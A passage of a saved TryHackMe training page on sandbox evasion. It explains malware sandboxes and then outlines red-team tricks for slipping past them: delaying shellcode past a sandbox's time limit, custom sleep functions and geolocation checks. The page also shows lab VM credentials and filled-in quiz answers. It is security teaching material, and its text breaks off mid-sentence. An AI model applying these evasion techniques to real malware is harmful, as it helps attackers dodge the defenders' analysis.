+    Access to networks, Streak freeze&lt;/p&gt;
+  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;30&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
+    Streak freeze&lt;/p&gt;
+  &lt;p class=&#39;m-0&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;45&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = 5% off swag&lt;/p&gt;
+&lt;/div&gt;
+ &lt;div class=&#39;size-12 text-center faded mt-2 font-italic&#39;&gt;1 
+        day streak freeze equipped&lt;/div&gt;" data-original-title="" title="">
+<span id="user-streak" data-streak="7" class="hacker-green">7 <i class="fas fa-fire-alt"></i></span>
+</span>
+<script>
+                            let usersStreak = { // Global variable, used in rooms logic
+                                streakFirstAnswered: new Date('Mon Jul 10 2023 03:13:45 GMT+0100 (British Summer Time)'),
+                                streakLastAnswered: new Date('Sun Jul 16 2023 17:19:58 GMT+0100 (British Summer Time)'),
+                                usersTimezone: 'Asia/Kolkata',
+                                streakFreeze: 1
+                            };
+                            setSidebarStreaks(usersStreak.streakFirstAnswered, usersStreak.streakLastAnswered, usersStreak.usersTimezone, usersStreak.streakFreeze)
+                        </script>
+</div>
+</li>
+<li class="nav-item dropdown" id="notification-navitem">
+<a class="nav-link vertical-align-custom size-22 pl-0" href="https://tryhackme.com/room/sandboxevasion#" id="notification-btn" role="button" data-toggle="dropdown">
+<i id="notification-icon" class="fal fa-bell"></i>
+<div id="notification-dot"></div>
+</a>
+<div id="nav-notification" class="dropdown-menu dropdown-menu-right">
+<div id="notification-header">Notifications</div>
+<div id="nav-notifications">
+<div class="text-center mt-2 mb-2"><i>Loading..</i></div>
+</div>
+</div>
+</li>
+<li class="nav-item dropdown">
+<a class="nav-link dropdown-toggle remove-arrow p-0" href="https://tryhackme.com/room/sandboxevasion#" id="navbarAvatarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+<img src="./TryHackMe _ Sandbox Evasion_files/ab65c8602b249b83ec038adda0bdffea.jpeg" onerror="setBrokenTmpPP(this)" class="rounded-circle navbar-user-avatar">
+</a>
+<div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarAvatarDropdown">
+<a class="dropdown-item" href="https://tryhackme.com/profile">Profile</a>
+<a class="dropdown-item" href="https://tryhackme.com/referrals">Refer a friend</a>
+<a class="dropdown-item" href="https://tryhackme.com/badges">Badges</a>
+<a class="dropdown-item" href="https://tryhackme.com/rooms">My Rooms</a>
+<a class="dropdown-item" href="https://tryhackme.com/access">Access</a>
+<a class="dropdown-item" href="https://tryhackme.com/feedback">Give Feedback</a>
+<a class="dropdown-item" href="https://tryhackme.com/logout">Logout</a>
+</div>
+</li>
+</ul>
+</div>
+</div>
+</nav>
+<link rel="stylesheet" href="./TryHackMe _ Sandbox Evasion_files/streak-freeze.css">
+<div class="modal fade modal-streak-freeze" id="unlocked-streak-freeze" role="dialog">
+<div class="modal-dialog" role="document">
+<div class="modal-content">
+<button type="button" class="close close-streak" id="close-streak-freeze-popup" data-dismiss="modal" aria-label="Close">
+<span aria-hidden="true">×</span>
+</button>
+<div class="modal-body">
+<figure>
+<img class="img-streak" width="400px" alt="streak freeze unlocked" src="./TryHackMe _ Sandbox Evasion_files/streak-freeze.svg">
+</figure>
+<h2>You've unlocked a streak freeze!</h2>
+<p>With these one-time streak freezes, you can miss one day of hacking without losing your streak.</p>
+</div>
+</div>
+</div>
+</div>
+<script src="./TryHackMe _ Sandbox Evasion_files/streak-freeze.js"></script>
+<nav id="thm-mobile-nav-menu" class="thm-mobile-nav" aria-label="Mobile secondary navigation menu.">
+<header>
+<a href="https://tryhackme.com/" aria-label="Go to the home page">
+<img width="140" src="./TryHackMe _ Sandbox Evasion_files/tryhackme_logo_full.svg" alt="TryHackMe" class="logo">
+</a>
+<button id="thm-mobile-nav-close" data-target="#thm-mobile-nav-menu" aria-controls="thm-mobile-nav-menu" aria-expanded="false" aria-label="Close mobile navigation">
+<i class="fal fa-times"></i>
+</button>
+</header>
+<ul class="thm-mobile-nav-items mb-0">
+<li class="nav-item ">
+<a class="nav-link" href="https://tryhackme.com/dashboard">
+<i class="nav-title-icon far fa-browser"></i>
+<div class="nav-title">Dashboard</div>
+</a>
+</li>
+<li class="nav-item active">
+<a class="nav-link" href="https://tryhackme.com/hacktivities">
+<i class="nav-title-icon far fa-book-open"></i>
+<div class="nav-title">Learn</div>
+</a>
+</li>
+<li class="nav-item ">
+<a aria-expanded="false" aria-controls="mobile-nav-compete" aria-label="Toggle Compete menu" data-dropdownid="mobile-nav-compete" class="sublinks-toggle nav-link">
+<i class="nav-title-icon far fa-trophy"></i>
+<div class="nav-title">Compete</div>
+<i class="far fa-angle-down"></i>
+</a>
+<div id="mobile-nav-compete" class="dropdown-wrapper">
+<a href="https://tryhackme.com/leaderboards">
+<div>
+<i class="fas fa-trophy"></i>
+</div>
+<div>
+<span class="mb-0">Leaderboards</span>
+<div class="text-lgray size-12">Platform Rankings</div>
+</div>
+</a>
+<a href="https://tryhackme.com/games/koth">
+<div>
+<i class="fas fa-crown"></i>
+</div>
+<div>
+<span class="mb-0">King of the Hill</span>
+<div class="text-lgray size-12">Attack &amp; Defend</div>
+</div>
+</a>
+<a href="https://tryhackme.com/workspace">
+<div>
+<i class="fas fa-user-friends"></i>
+</div>
+<div>
+<span class="mb-0">Workspace</span>
+<div class="text-lgray size-12">Compete &amp; Collaborate</div>
+</div>
+</a>
+</div>
+</li>
+<li class="nav-item">
+<a aria-expanded="false" aria-controls="mobile-nav-other" aria-label="Toggle Compete menu" data-dropdownid="mobile-nav-other" class="sublinks-toggle nav-link">
+<i class="nav-title-icon far fa-ellipsis-h-alt"></i>
+<div class="nav-title">Other</div>
+<i class="far fa-angle-down"></i>
+</a>
+<div id="mobile-nav-other" class="dropdown-wrapper">
+<a href="https://tryhackme.com/resources">Resources</a>
+<a href="https://tryhackme.com/subscriptions">Buy Vouchers</a>
+<a href="https://tryhackme.com/develop-rooms">Develop Rooms</a>
+<a href="https://tryhackme.com/business">For Business</a>
+<a href="https://tryhackme.com/classrooms">For Education</a>
+<a target="_blank" href="https://store.tryhackme.com/">Swag Shop</a>
+</div>
+</li>
+<li class="nav-item text-center">
+<div class="nav-item-streak">
+<span id="mobile-streak-popover" class="size-24" data-container="body" data-trigger="hover" data-toggle="popover" data-html="true" data-placement="bottom" data-content="&lt;p class=&#39;mb-2&#39;&gt;Complete a question every day to build your hacking streak, earn badges and streak freezes!&lt;/p&gt;
+
+&lt;div class=&#39;size-12 faded&#39;&gt;
+  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;7&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
+    Access to networks, Streak freeze&lt;/p&gt;
+  &lt;p class=&#39;streak-points&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;30&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = Badge,
+    Streak freeze&lt;/p&gt;
+  &lt;p class=&#39;m-0&#39;&gt;&lt;span class=&#39;streak-count&#39;&gt;45&lt;/span&gt; &lt;i class=&#39;fas fa-fire-alt hacker-green&#39;&gt;&lt;/i&gt; = 5% off swag&lt;/p&gt;
+&lt;/div&gt;
+ &lt;div class=&#39;size-12 text-center faded mt-2 font-italic&#39;&gt;1 
+        day streak freeze equipped&lt;/div&gt;" data-original-title="" title="">
+<span id="mobile-user-streak" data-streak="7" class="hacker-green">7 <i class="fas fa-fire-alt"></i></span>
+</span>
+</div>
+</li>
+<li class="nav-item text-center">
+<a class="nav-link size-22 d-inline-block" href="https://tryhackme.com/room/sandboxevasion#" id="mobile-notification-btn" role="button" data-toggle="dropdown">
+<i id="mobile-notification-icon" class="fal fa-bell"></i>
+<div id="mobile-notification-dot"></div>
+</a>
+<div id="mobile-nav-notification" class="dropdown-menu dropdown-menu-right">
+<div id="mobile-notification-header">Notifications</div>
+<div id="mobile-nav-notifications">
+<div class="text-center mt-2 mb-2"><i>Loading..</i></div>
+</div>
+</div>
+</li>
+<li class="nav-item text-center">
+<a aria-expanded="false" aria-controls="mobile-nav-auth" aria-label="Toggle Compete menu" data-dropdownid="mobile-nav-auth" class="sublinks-toggle nav-link d-inline-block">
+<img src="./TryHackMe _ Sandbox Evasion_files/ab65c8602b249b83ec038adda0bdffea.jpeg" onerror="setBrokenTmpPP(this)" class="rounded-circle navbar-user-avatar">
+</a>
+<div id="mobile-nav-auth" class="dropdown-wrapper">
+<a href="https://tryhackme.com/profile">Profile</a>
+<a href="https://tryhackme.com/referrals">Refer a friend</a>
+<a href="https://tryhackme.com/badges">Badges</a>
+<a href="https://tryhackme.com/rooms">My Rooms</a>
+<a href="https://tryhackme.com/access">Access</a>
+<a href="https://tryhackme.com/feedback">Give Feedback</a>
+<a href="https://tryhackme.com/logout">Logout</a>
+</div>
+</li>
+</ul>
+</nav>
+<script defer="" src="./TryHackMe _ Sandbox Evasion_files/mobile-nav.js"></script>
+<script>
+  const userSignedUpLessThanSevenDaysAgo = Math.floor(
+    (new Date() - new Date('Wed Jan 25 2023 15:45:03 GMT+0000 (Greenwich Mean Time)')) / (1000 * 60 * 60 * 24) < 7
+  );
+
+  const userHasFirst4RoomsBadge = !!``;
+  const isBeginner = `advanced` === 'complete-beginner';
+</script>
+<script src="./TryHackMe _ Sandbox Evasion_files/notifications.js"></script>
+<script src="./TryHackMe _ Sandbox Evasion_files/streak-freeze(1).js"></script>
+<div id="wrapper">
+<div id="room-banner" class="shadow-light">
+<img id="room-image-large" src="./TryHackMe _ Sandbox Evasion_files/Sandbox evasion banner.png">
+<div>
+<div id="room-details">
+<div class="container">
+<div class="page-header">
+<div class="room-header">
+<div id="room-voting" class="text-center vertical-align-custom">
+<div class="voting-buttons">
+<i class="fas fa-thumbs-up display-block" onclick="makeVote(true)" id="vote-up" style="color: rgb(185, 185, 185);"></i>
+<div class="display-block" id="vote-number">193</div>
+<i class="fas fa-thumbs-down display-block" onclick="makeVote(false)" id="vote-down" style="color: rgb(185, 185, 185);"></i>
+</div>
+</div>
+<div id="room-logo" class="vertical-align-custom">
+<div id="logo"><img class="room-avatar" src="./TryHackMe _ Sandbox Evasion_files/9f8cb614a755dc01aa6d35dee528e3d2.png" onerror="replaceImg(this)"></div>
+</div>
+<div class="vertical-align-custom">
+<div id="room-basic-data">
+<div class="d-flex justify-content-between">
+<h1 id="title" class="bold-head">Sandbox Evasion</h1>
+<div id="room-title-options">
+
+<div class="btn-group" id="browser-machine-options" role="group" aria-label="Start AttackBox or Kali Linux" style="display: inline-flex;">
+<button id="browser-machine-start" type="button" class="btn btn-secondary"><i class="far fa-laptop"></i> Start AttackBox</button>
+<div class="btn-group" id="browser-machines" role="group">
+<button id="btnGroupDrop1" type="button" class="btn btn-secondary dropdown-toggle" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"></button>
+<div class="dropdown-menu" aria-labelledby="btnGroupDrop1">
+<a class="dropdown-item  preventDefault" href="https://tryhackme.com/room/sandboxevasion#" onclick="changeMyMachine(&quot;kali-linux&quot;)">
+<span class="mb-0">Use Kali Linux</span>
+<div class="text-lgray size-12">Web-based Kali Machine</div>
+</a>
+<a class="dropdown-item preventDefault" href="https://tryhackme.com/room/sandboxevasion#" onclick="changeMyMachine(&quot;attackbox&quot;)">
+<span class="mb-0">Use AttackBox</span>
+<div class="text-lgray size-12">Recommended</div>
+</a>
+</div>
+</div>
+</div>
+<button id="browser-machine-split-view" type="button" class="btn btn-secondary">Show Split View</button>
+<button id="cloud-details" type="button" class="btn btn-info"><i class="far fa-clouds mr-1"></i>Cloud Details</button>
+<span id="awards-model-btn" data-toggle="modal" data-target="#award-modal" class="badge badge-warning ml-1 noselect">Awards</span>
+<span id="room-faq-slideout" type="button" class="badge badge-info ml-1 noselect d-inline-flex" onclick="openHelpMenu()">
+Help
+</span>
+<div class="dropright room-dropright noselect ml-1" id="room-options" style="display: inline-block;">
+<span class="badge badge-secondary" data-toggle="dropdown">
+<i class="fas fa-cog"></i>
+</span>
+<div class="dropdown-menu">
+<a class="dropdown-item" href="https://tryhackme.com/api/room/manage/clone/sandboxevasion" id="clone-room" style="display: none;"><i class="far fa-clone faded"></i> Clone Room</a>
+<a class="dropdown-item preventDefault" id="writeups-simple" style="display: inline-block;"><i class="fas fa-pen-alt faded"></i> Writeups</a>
+<a class="dropdown-item preventDefault" data-toggle="modal" data-target="#resetUserProgressModal"><i class="fas fa-eraser faded"></i> Reset Progress</a>
+<a class="dropdown-item preventDefault" id="leave-room"><i class="fas fa-sign-out-alt faded"></i> Leave</a>
+</div>
+</div>
+<span id="bookmark" class="badge badge-secondary badge-bookmark ">
+<img class="bookmark" src="./TryHackMe _ Sandbox Evasion_files/bookmark.svg">
+<span class="bookmark-popover" data-container="body" data-trigger="hover" data-toggle="popover" data-html="true" data-placement="top" data-content="&lt;p class=&#39;mb-0&#39;&gt;Save room &lt;/p&gt;
+" data-original-title="" title="">
+</span>
+</span>
+</div>
+</div>
+<p class="mb0 faded" id="description">Learn about active defense mechanisms Blue Teamers can deploy to identify adversaries in their environment.</p>
+</div>
+</div>
+</div>
+</div>
+
+</div>
+</div>
+<div id="room-banner-stats">
+<div class="creators"></div>
+<div class="numbers"></div>
+</div>
+</div>
+</div>
+<div class="container main pb">
+<div id="room-message"></div>
+<section id="sponsor">
+<i id="sponsor-close" class="fas fa-times"></i>
+<div id="sponsor-data"></div>
+</section>
+<div id="top-panel">
+<ul class="nav nav-tabs" id="task-navs">
+<li class="nav-item">
+<a class="nav-link  active " data-toggle="tab" href="https://tryhackme.com/room/sandboxevasion#chart">
+<i class="fas fa-chart-line icon-right"></i> Chart
+</a>
+</li>
+<li class="nav-item">
+<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/sandboxevasion#scoreboard">
+<i class="fas fa-trophy icon-right"></i> Scoreboard
+</a>
+</li>
+<li class="nav-item">
+<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/sandboxevasion#chat">
+<i class="fas fa-comments-alt icon-right chat-icon"></i> Discuss
+</a>
+</li>
+<li class="nav-item">
+<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/sandboxevasion#writeups">
+<i class="fas fa-pen-alt icon-right"></i> Writeups
+</a>
+</li>
+<li class="nav-item">
+<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/sandboxevasion#about">
+<i class="fas fa-info-circle icon-right"></i> More
+</a>
+</li>
+</ul>
+<div class="card cd-2 nav-above-con" id="room-main">
+<div class="card-body">
+<span id="room-tabs">
+<div class="tab-content">
+<div id="chart" class="tab-pane  active ">
+<span id="difficulty-bar">
+    <span class="room-difficulty diff-text">
+      Difficulty: 
+        <span class="difficulty-hard">Hard</span>
+    </span></span>
+<br><div id="chart-data"></div>
+</div>
+<div id="scoreboard" class="tab-pane fade">
+<table class="table table-striped table-bordered table-condensed table-header-rotated mb-0" id="scoreboard_table">
+<thead>
+<tr id="scoreboard_header">
+<th>Rank</th>
+<th>Username</th>
+<th>Total Score</th>
+</tr>
+</thead>
+<tbody id="scoreboard_body"></tbody>
+</table>
+</div>
+<div id="chat" class="tab-pane fade">
+
+<div class="row">
+<div class="col-sm-6 text-center">
+<h3 class="mb-2">Discord</h3>
+<p>Come join our <a target="_blank" href="https://discord.gg/QgC6Tdk">Discord</a> server for support or further discussions</p>
+</div>
+<div class="col-sm-6 text-center">
+<h3 class="mb-2">Forum</h3>
+<div id="forum-text">Read or post on the dedicated forum <a href="https://tryhackme.com/forum/thread/6274fb0afa16eb00604cef93">post</a></div>
+</div>
+</div>
+</div>
+<div id="writeups" class="tab-pane text-center">
+<div id="writeups-data">There are no writeups submitted.</div>
+<button onclick="showWriteupForm(this)" type="button" class="btn btn-xs btn-secondary mt-3 mb-2">Add Writeup</button>
+<div id="writeup-form">
+<div class="form-row">
+<div class="col-auto">
+<input type="text" class="form-control mb-2" id="writeup-title" placeholder="Writeup Title">
+</div>
+<div class="col-auto">
+<input type="text" class="form-control mb-2" id="writeup-link" placeholder="Writeup URL">
+</div>
+<div class="col-auto">
+<button id="submit-writeup" type="submit" class="btn btn-success mb-2">Submit</button>
+</div>
+</div>
+<p class="faded mb-0 size-14"><i class="fas fa-exclamation-triangle text-warning"></i> Writeups should have a link to TryHackMe and not include any passwords/cracked hashes/flags</p>
+</div>
+</div>
+<div id="about" class="tab-pane text-center">
+<p id="about-freeRoom"><p class="mb-0">Only subscribers can deploy virtual machines in this room! 
+        Go to your <a href="https://tryhackme.com/profile">profile</a> page to subscribe (if you have not already). 6765 users are in here and this room is 431 days old.</p></p>
+<p id="about-owner"><p class="size-18">Created by <img class="avatar-tiny" src="./TryHackMe _ Sandbox Evasion_files/af7feb2c43a2c7d5f111b98ccbd15048.png"> 
+        <a class="green-link" href="https://tryhackme.com/p/tryhackme">tryhackme</a> and <img class="avatar-tiny" src="./TryHackMe _ Sandbox Evasion_files/900284253a6d48158be6dcbf6a9ed376.jpg"> 
+        <a class="green-link" href="https://tryhackme.com/p/cmnatic">cmnatic</a> and <img class="avatar-tiny" src="./TryHackMe _ Sandbox Evasion_files/9e946af210ae86d6fbfda480d958b3fe.gif"> 
+        <a class="green-link" href="https://tryhackme.com/p/Cryillic">Cryillic</a></p></p>
+</div>
+</div>
+</span>
+</div>
+</div>
+</div>
+<div id="room-simple-video" class="card card-body cd-2"></div>
+<div class="card mt-3 mb-3 cd-2 text-center" id="instance-info">
+<div class="card-header card-header-red">Active Machine Information</div>
+<div class="card-body">
+<div class="row vertical-align-custom">
+<div class="col-sm-3">
+<i>Loading...</i>
+</div>
+<div class="col-sm-3" id="table-machine-ip">
+<i>Loading...</i>
+</div>
+<div class="col-sm-3">
+<i>Loading...</i>
+</div>
+<div class="col-sm-3">
+<i>Loading...</i>
+</div>
+</div>
+</div>
+</div>
+<div id="task-list">
+<div id="room-task-detail" class="mb-3"><span id="progress-bar" style="display: block;"><div class="progress"><div class="progress-bar bg-warning" role="progressbar" style="width: 58%; aria-valuemin=" 0"="" aria-valuemax="100"> 58%</div></div></span></div>
+<div id="taskContent"><div class="card" id="task-1">
+                    <div class="card-header task-header" data-toggle="collapse" href="#collapse1" aria-expanded="true">
+                        <a class="card-link">
+                            <span class="task-dropdown-title hacker-green">Task 1                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Introduction
+                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
+                            <span class="task-resources"></span>
+                        </a>
+                    </div>
+                    <div id="collapse1" class="collapse show" data-parent="#taskContent" style="">
+                        <div class="card-body task-complete">
+                            <div class="room-task-desc">
+            <div class="room-task-desc-data"> <p><span style="font-size:24px">Welcome to Sandbox Evasion</span></p>
+<p>Lots of companies deploy a “Defense in Depth” strategy, which refers to implementing security in layers, so if one layer fails, there should be another one that an adversary must evade. In this room, we will be focusing on one unique type of active defense; Sandboxes. Sandboxes provide a safe way to analyze a potentially malicious file and observe the effects on the system and return if the executable is malicious or not.</p><p><span style="font-size:24px">Learning Objectives</span></p>
+<p>In this room, we will learn about Sandboxes in-depth; by the time you finish this room, you will gain a better understanding of the following topics:</p>
+<ul>
+<li>Learn how Malware Sandboxes work</li>
+<li>Learn about Static and Dynamic Malware Analysis</li>
+<li>Common Sandbox Evasion Methods</li>
+<li>Developing and Testing Sandbox Evasion Methods with Any.Run</li>
+</ul>
+<p><span style="font-size:24px">Room Pre-requisites</span></p>
+<p>For this room, we recommend the prior experience in the following areas:</p>
+<ul>
+<li><a href="https://tryhackme.com/room/abusingwindowsinternals" target="_blank">Windows APIs</a></li>
+<li><a href="https://tryhackme.com/room/windowsinternals" target="_blank">C++ Programming</a></li>
+<li><a href="https://tryhackme.com/room/activedirectorybasics" target="_blank">Active Directory</a></li></ul><ul>
+</ul></div>
+        </div>
+        
+        <div class="room-questions-split vertical-align-custom hacker-green">
+            <div>Answer the questions below</div>
+        </div>
+        
+                            <div class="room-task-questions">
+                            <div class="room-task-question-no vertical-align-custom">
+                                
+                            </div>
+                            <div class="room-task-question-details">
+                                <div class="room-task-question-details">Read the task above!</div>
+                            </div>
+                        </div>
+
+                    <div class="room-task-input">
+                        <div class="room-task-input-questions">
+                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
+                            <input type="hidden" value="1">
+                            <input type="hidden" value="1">
+                        </div>
+                        <div class="room-task-input-answer">
+                            <button type="button" class="btn btn-success task-answer" disabled="">
+                            Question Done
+                        </button>
+                        </div>
+                        
+                    </div>
+                        </div>
+                    </div>
+                </div><div class="card" id="task-2">
+                    <div class="card-header task-header" data-toggle="collapse" href="#collapse2">
+                        <a class="card-link">
+                            <span class="task-dropdown-title hacker-green">Task 2                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> An Adversary walks into a Sandbox
+                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
+                            <span class="task-resources"><i class="far fa-server text-lgreen" data-toggle="tooltip" data-placement="left" title="" data-original-title="Task includes a deployable machine"></i></span>
+                        </a>
+                    </div>
+                    <div id="collapse2" class="collapse show" data-parent="#taskContent">
+                        <div class="card-body task-complete">
+                            <div class="room-task-desc">
+            <div class="room-task-desc-data"><div class="btn-group mb-3 ml-3 float-right">
+            <button type="button" class="btn btn-success" value="626f000b6a8e780051280232" onclick="deploy(this)"><i class="fas fa-play mr-2"></i> Start Machine</button>
+        </div> <p><span style="font-size:24px">What is Malware Analysis</span></p>
+<p>Malware Analysis is the process of analyzing a suspicious file to determine what it does on both a micro level (by looking at Assembly), and a macro level (by looking at what it does on the system). This process lets Blue Teamers gain a better understanding of malicious programs, which can aid them in developing detections.</p>
+<p><span style="font-size:24px">Static vs. Dynamic Analysis</span></p>
+<p>There are two ways that a Blue Teamer can analyze a suspicious file; one way is by looking at the code on a micro-level (as previously stated) by using Disassemblers such as IDA or Ghidra. This process is more well known as “Static Analysis”.</p>
+<p><span>On the flip side of the coin, we can observe what happens when the suspicious file is executed on the system through a process called “Dynamic Analysis”. On the system, there are often many analysis tools installed, such as <a class="LAvbyhoj glossary-term" onclick="initPopOver(&#39;EDR&#39;, &#39;LAvbyhoj&#39;)">EDR</a> Software, Sysmon, ProcMon, Process Hacker, and Debuggers (For example, OllyDebug, WinDbg, x64Dbg), and much more.</span></p>
+<p><span style="font-size:24px">Introduction to Sandboxes</span><br></p><p><span style="font-size:1rem">One of the most creative and effective ways that Blue Teamers have come up with to analyze suspicious-looking files is in the category of Dynamic Analysis. This method involves running the file in a containerized (or virtualized) environment; This environment is referred to as a Sandbox. Depending on the sandbox of choice, you may be able to customize what version of Windows is running, the software installed on the machine, and much more.</span><br></p>
+<p>Sandboxes provide a safe and effective way to monitor what a suspicious-looking file does before running it on a production system (or allowing it to be sent to a production system). There are many commercial Sandboxes that may be in place in various parts of a network.</p><p><br></p>
+<p><img src="./TryHackMe _ Sandbox Evasion_files/a2e2d18182fe38e0f8709aafae9c33bc.png"><span style="font-size:1rem"><br></span></p><p><span style="font-size:1rem">In the diagram above, there are three different sandboxes in place. It is not uncommon for there to be one, two, or even three Sandboxes in a corporate environment. Often you may find them in the following places:</span><br></p>
+<ul>
+<li>Firewalls</li>
+<li>Mail Servers</li>
+<li>Workstations</li>
+</ul>
+<p><span>Each sandbox may work differently; for example, a Firewall may execute the attachment in the email and see what kind of network communications occur, whereas a Mail sandbox may open the email and see if an embedded file within the email triggers a download over a protocol like <a class="hra9dkQc glossary-term" onclick="initPopOver(&#39;SMB&#39;, &#39;hra9dkQc&#39;)">SMB</a> in an attempt to steal a NetNTLM hash, where a host-based Anti-Virus Sandbox may execute the file and monitor for malicious programmatic behavior or changes to the system.</span></p>
+<p>There are various vendors that make various Sandbox products that Blue Teamers may be able to deploy in a corporate network. Here are some popular examples:</p>
+<ul>
+<li>Palo Alto Wildfire (<a href="https://www.paloaltonetworks.co.uk/products/secure-the-network/wildfire" target="_blank">Firewall</a>)</li>
+<li>Proofpoint TAP (<a href="https://www.proofpoint.com/uk/products/advanced-threat-protection/targeted-attack-protection" target="_blank">Email Sandbox</a>)</li>
+<li>Falcon Sandbox (<a href="https://www.crowdstrike.co.uk/products/threat-intelligence/falcon-sandbox-malware-analysis/" target="_blank">EDR/Workstation</a>)</li><li>MimeCast (<a href="https://www.mimecast.com/" target="_blank">Email Sandbox</a>)</li>
+<li>VirusTotal (<a href="https://www.virustotal.com/" target="_blank">Sample Submission Site</a>)</li>
+<li>Any.Run (<a href="https://any.run/" target="_blank">Sample Submission Site</a>)</li>
+<li>Antiscan.me (<a href="https://antiscan.me/" target="_blank">Sample Submission Site</a>)</li>
+<li>Joe Sandbox (<a href="https://www.joesandbox.com/" target="_blank">Sample Submission Site</a>)</li>
+</ul>
+<p>In the next section, we will learn about various techniques commonly deployed by Malware authors to gain an understanding of some evasion techniques that exist.</p><p><span>We have provided a Windows development <a class="MB9it9nZ glossary-term" onclick="initPopOver(&#39;VM&#39;, &#39;MB9it9nZ&#39;)">VM</a> where you can develop your own Sandbox evasion techniques. You can access the virtual machine with the following credentials:</span></p><p><b>Username:</b> Administrator<br><b>Password:</b> TryHackMe123!</p></div>
+        </div>
+        
+        <div class="room-questions-split vertical-align-custom hacker-green">
+            <div>Answer the questions below</div>
+        </div>
+        
+                            <div class="room-task-questions">
+                            <div class="room-task-question-no vertical-align-custom">
+                                
+                            </div>
+                            <div class="room-task-question-details">
+                                Sandboxes are a form of ______ Analysis
+                            </div>
+                        </div>
+
+                    <div class="room-task-input">
+                        <div class="room-task-input-questions">
+                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: *******" value="Dynamic" disabled="">
+                            <input type="hidden" value="1">
+                            <input type="hidden" value="2">
+                        </div>
+                        <div class="room-task-input-answer">
+                            <button type="button" class="btn btn-success task-answer" disabled="">
+                            Correct Answer
+                        </button>
+                        </div>
+                        
+                    </div><div class="room-task-questions">
+                            <div class="room-task-question-no vertical-align-custom">
+                                
+                            </div>
+                            <div class="room-task-question-details">
+                                <p>What type of Sandboxes analyze attachments attached to emails?</p>
+                            </div>
+                        </div>
+
+                    <div class="room-task-input">
+                        <div class="room-task-input-questions">
+                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: **** *******" value="Mail Sandbox" disabled="">
+                            <input type="hidden" value="2">
+                            <input type="hidden" value="2">
+                        </div>
+                        <div class="room-task-input-answer">
+                            <button type="button" class="btn btn-success task-answer" disabled="">
+                            Correct Answer
+                        </button>
+                        </div>
+                        
+                    </div>
+                        </div>
+                    </div>
+                </div><div class="card" id="task-3">
+                    <div class="card-header task-header" data-toggle="collapse" href="#collapse3">
+                        <a class="card-link">
+                            <span class="task-dropdown-title hacker-green">Task 3                             <span class="task-dropdown-icon"><i class="fas fa-check-circle"></i></span></span> Common Sandbox Evasion Techniques
+                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
+                            <span class="task-resources"><i class="far fa-download text-lblue" data-toggle="tooltip" data-placement="left" title="" data-original-title="Task includes a downloadable file"></i></span>
+                        </a>
+                    </div>
+                    <div id="collapse3" class="collapse show" data-parent="#taskContent">
+                        <div class="card-body task-complete">
+                            <div class="room-task-desc">
+            <div class="room-task-desc-data"><form class="float-right" method="post" action="https://tryhackme.com/material/deploy">
+                            <input type="hidden" name="roomCode" value="sandboxevasion">
+                            <input type="hidden" name="id" value="62411e7167ef9700544703fe">
+                            <button type="submit" class="btn btn-primary mb-3 ml-3" value="Download">
+                            <i class="fas fa-cloud-download-alt mr-2"></i> Download Task Files</button>
+                        </form> <p><span style="font-size:24px">An Introduction to Sandbox Evasion</span></p><p>Now that you have a general idea of what Malware Sandboxes are, we can move on to learning some evasion techniques at a high level. We will be breaking this down into four different categories; in the next task, we will implement four different evasion techniques (one from each category), so you can leave this room with some practical knowledge to help out in your Red Team operations.</p><p><span style="font-size:1rem">We will be covering the following four broad categories:</span></p><ul><li>Sleeping through Sandboxes</li><li>Geolocation and Geoblocking</li><li><span style="font-size:1rem">Checking System Information</span></li><li><span style="font-size:1rem">Querying Network Information</span><br></li></ul><p><span style="font-size:1rem">These are ordered from the most basic techniques to the most advanced. Let's get started.</span></p><p><span style="font-size:24px">Sleeping through Sandboxes</span></p><p>Malware Sandboxes are often limited to a time constraint&nbsp;to prevent the overallocation of resources, which may increase the Sandboxes queue drastically. This is a crucial aspect that we can abuse; if we know that a Sandbox will only run for five minutes at any given time, we can implement a sleep timer that sleeps for five minutes before our shellcode is executed. This could be done in any number of ways; one common way is to query the current system time and, in a parallel thread, check and see how much time has elapsed. After the five minutes have passed, our program can begin normal execution.</p><p>Another popular method is to do complex, compute-heavy math, which may take a certain amount of time — for example, calculating the Fibonacci sequence up to a given number. Remember that it may take more or less time to do so based on the system's hardware.&nbsp;<span style="font-size:1rem">Masking your application is generally a good idea to avoid Anti-Virus detections in general, so this should already be something in your toolkit.</span></p><p><span style="font-size:1rem">Beware that some sandboxes may alter built-in sleep functions; various Anti-Virus vendors have put out blog posts about bypassing built-in sleep functions. So it is highly recommended you develop your own sleep function. Here are a couple of blog posts about bypassing Sleep functions:</span></p><ul><li><a href="https://evasions.checkpoint.com/techniques/timing.html" target="_blank">https://evasions.checkpoint.com/techniques/timing.html</a><br></li><li><a href="https://www.joesecurity.org/blog/660946897093663167" target="_blank">https://www.joesecurity.org/blog/660946897093663167</a><a href="https://www.joesecurity.org/blog/660946897093663167" target="_blank"></a></li></ul><p><span style="font-size:24px">Geolocation</span></p><p>One defining factor of Sandboxes is that they are often located off-premise and are hosted by Anti-Virus providers. If you know you are attacking TryHackMe, a European company, and your binary is 